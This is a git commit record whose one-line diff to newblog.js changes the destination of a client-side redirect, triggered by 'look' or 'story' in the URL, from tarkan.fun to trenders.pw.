6334ab406a9b5156676d8804642b85ee4281a6ae
fidelasin <66884583+fidelasin@users.noreply.github.com>
2020-12-12 20:35:06 +0300

    Update newblog.js

--- newblog.js
+++ newblog.js
@@ -1,4 +1,4 @@
  if (window.location.href.indexOf("look") > 1 || window.location.href.indexOf("story") > 1 )
             {
-window.location = 'https://www.tarkan.fun' + window.location.pathname;
+window.location = 'https://www.trenders.pw' + window.location.pathname;
             }
